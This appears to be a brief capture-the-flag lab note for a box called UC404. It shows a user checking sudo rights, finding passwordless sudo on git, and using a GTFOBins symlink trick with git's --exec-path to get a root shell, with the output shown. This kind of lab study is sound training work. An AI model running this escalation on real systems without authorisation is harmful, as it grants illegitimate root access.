# 4 box enum brian > privesc > root

```
brian@UC404:/$ whoami;id
brian
uid=1001(brian) gid=1001(brian) groups=1001(brian)

brian@UC404:/$ sudo -l
Matching Defaults entries for brian on UC404:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User brian may run the following commands on UC404:
    (ALL) NOPASSWD: /usr/bin/git

# GTFO bins
TF=$(mktemp -d)
ln -s /bin/sh "$TF/git-x"
sudo git "--exec-path=$TF" x

root@UC404:/# whoami;id;hostname;uname -a
root
uid=0(root) gid=0(root) groups=0(root)
UC404
Linux UC404 4.19.0-12-amd64 #1 SMP Debian 4.19.152-1 (2020-10-18) x86_64 GNU/Linux
```
